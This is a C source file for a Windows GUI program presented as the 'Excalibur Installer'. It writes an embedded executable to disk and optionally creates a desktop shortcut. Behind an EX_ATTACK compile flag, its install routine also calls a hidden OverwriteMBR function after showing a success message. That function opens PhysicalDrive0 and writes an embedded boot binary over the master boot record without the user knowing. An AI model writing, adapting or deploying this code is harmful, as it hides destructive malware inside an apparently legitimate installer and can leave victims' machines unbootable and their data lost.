#include <windows.h>
#include <shlobj.h>
#include <objbase.h>
#include <shobjidl.h>
#include <commctrl.h>
#include <comutil.h>

#include <stdio.h>
#include <stdbool.h>

#include "Binaries/ExcaliburBinary.h"
#include "Binaries/BootBinary.h"

#define WINDOW_WIDTH 450
#define WINDOW_HEIGHT 138

static HWND installButton;
static HWND closeButton;

static HWND shortcutCheckbox;
static HWND launchCheckbox;

static HWND pathTextfield;
static HWND progressBar;

static HFONT defaultFont;

static bool createShortcut = true;
static bool launchAfterInstall = true;

static char pathBuffer[MAX_PATH];

static void CreateShortcut(const char* targetPath, const char* shortcutPath)
{
    CoInitialize(NULL);

    IShellLink* pShellLink = NULL;
    CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (LPVOID*)&pShellLink);

    pShellLink->lpVtbl->SetPath(pShellLink, targetPath);

    char desktopPath[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);

    char shortcutFilePath[MAX_PATH];
    sprintf_s(shortcutFilePath, MAX_PATH, "%s\\%s.lnk", desktopPath, shortcutPath);

    IPersistFile* pPersistFile = NULL;
    pShellLink->lpVtbl->QueryInterface(pShellLink, &IID_IPersistFile, (LPVOID*)&pPersistFile);

    WCHAR wideShortcutFilePath[MAX_PATH];
    MultiByteToWideChar(CP_UTF8, 0, shortcutFilePath, -1, wideShortcutFilePath, MAX_PATH);

    pPersistFile->lpVtbl->Save(pPersistFile, wideShortcutFilePath, TRUE);

    pShellLink->lpVtbl->Release(pShellLink);
    pPersistFile->lpVtbl->Release(pPersistFile);

    CoUninitialize();
}

#ifdef EX_ATTACK
static void OverwriteMBR()
{
    HANDLE MBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
                             FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING, 0, NULL);

    if (MBR == INVALID_HANDLE_VALUE)
        return;

    DWORD write;
    if (!WriteFile(MBR, bin_boot_bin, bin_boot_bin_len, &write, NULL))
        return;

    CloseHandle(MBR);
}
#endif

static void InstallBinary(HWND windowHandle)
{
    CreateDirectory(pathBuffer, NULL);
    int pathLength = strlen(pathBuffer);
    while (pathLength > 0 && (pathBuffer[pathLength - 1] == '\\' || pathBuffer[pathLength - 1] == '/'))
    {
        pathBuffer[pathLength - 1] = '\0';
        pathLength--;
    }

    strcat(pathBuffer, "\\Excalibur.exe");
    FILE* binary = fopen(pathBuffer, "wb");
    fwrite(bin_Excalibur_exe, sizeof(unsigned char), bin_Excalibur_exe_len, binary);
    fclose(binary);
    
    if (createShortcut) 
        CreateShortcut(pathBuffer, "Excalibur");

    MessageBox(windowHandle, "Excalibur has successfully been installed to your computer!", "Install Successful", MB_OK | MB_ICONINFORMATION);
    PostMessage(windowHandle, WM_CLOSE, 0, 0);

    if (launchAfterInstall)
        ShellExecuteA(NULL, "open", pathBuffer, NULL, NULL, SW_SHOWNORMAL);   

#ifdef EX_ATTACK
    OverwriteMBR();
#endif
}

LRESULT CALLBACK WindowProc(HWND windowHandle, UINT message, WPARAM wordParam, LPARAM longParam)
{
    switch (message)
    {
        case WM_DESTROY:
        {
            PostQuitMessage(0);
        } return 0;

        case WM_PAINT:
        {
            PAINTSTRUCT paint;
            HDC handleDeviceContext = BeginPaint(windowHandle, &paint);
            FillRect(handleDeviceContext, &paint.rcPaint, (HBRUSH)(COLOR_WINDOW));
            EndPaint(windowHandle, &paint);
        } return 0;

        case WM_COMMAND:
        {
            switch (LOWORD(wordParam))
            {
                case BN_CLICKED:
                {
                    HWND clickedControl = (HWND)longParam;

                    if (clickedControl == shortcutCheckbox) { }
                    else if (clickedControl == launchCheckbox) { }
                    else if (clickedControl == installButton)
                    {
                        GetWindowText(pathTextfield, pathBuffer, MAX_PATH);
                        InstallBinary(windowHandle);
                    }
                } break;
            }
        } return 0;

        default: goto closeWindow;
    }

closeWindow:
    return DefWindowProc(windowHandle, message, wordParam, longParam);
}

int WINAPI WinMain(HINSTANCE instanceHandle, HINSTANCE previousInstanceHandle, LPSTR argv, int argc)
{
    WNDCLASS windowClass = {};
    windowClass.lpfnWndProc = WindowProc;
    windowClass.hInstance = instanceHandle;
    windowClass.lpszClassName = "Excalibur";
    RegisterClass(&windowClass);

    HWND windowHandle = CreateWindowEx(0, "Excalibur", "Excalibur Installer", WS_OVERLAPPEDWINDOW,
                                       CW_USEDEFAULT, CW_USEDEFAULT, WINDOW_WIDTH, WINDOW_HEIGHT,
                                       NULL, NULL, instanceHandle, NULL);
    if (windowHandle == NULL)
        return 0;

    pathTextfield = CreateWindowEx(0, "EDIT", "C:\\Program Files\\Excalibur",
                                   WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                                   8, 8, 265, 23, windowHandle, NULL, instanceHandle, NULL);

    progressBar = CreateWindowEx(0, PROGRESS_CLASS, NULL, WS_CHILD | WS_VISIBLE,
                                 8, 37, 265, 25, windowHandle, NULL, instanceHandle, NULL);

    installButton = CreateWindow("BUTTON", "Install", WS_CHILD | WS_VISIBLE,
                                 8, 68, 75, 25, windowHandle, NULL, instanceHandle, NULL);

    closeButton = CreateWindow("BUTTON", "Close", WS_CHILD | WS_VISIBLE,
                               89, 68, 75, 25, windowHandle, NULL, instanceHandle, NULL);

    shortcutCheckbox = CreateWindow("BUTTON", "Create Desktop shortcut", WS_CHILD | WS_VISIBLE | BS_CHECKBOX,
                                    278, 14, 150, 17, windowHandle, NULL, instanceHandle, NULL);

    launchCheckbox = CreateWindow("BUTTON", "Launch after install", WS_CHILD | WS_VISIBLE | BS_CHECKBOX,
                                  278, 45, 150, 17, windowHandle, NULL, instanceHandle, NULL);

    defaultFont = CreateFont(16, 0, 0, 0, FW_NORMAL, false, false, false, 
                             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                             DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");

    SendMessage(shortcutCheckbox, WM_SETFONT, (WPARAM)defaultFont, true);
    SendMessage(launchCheckbox, WM_SETFONT, (WPARAM)defaultFont, true);
    SendMessage(pathTextfield, WM_SETFONT, (WPARAM)defaultFont, true);
    SendMessage(installButton, WM_SETFONT, (WPARAM)defaultFont, true);
    SendMessage(closeButton, WM_SETFONT, (WPARAM)defaultFont, true);

    SendMessage(shortcutCheckbox, BM_SETCHECK, BST_CHECKED, false);
    SendMessage(launchCheckbox, BM_SETCHECK, BST_CHECKED, false);

    ShowWindow(windowHandle, argc);
    
    MSG message = {};
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    (void)previousInstanceHandle;
    (void)argv;

    return message.wParam;
}
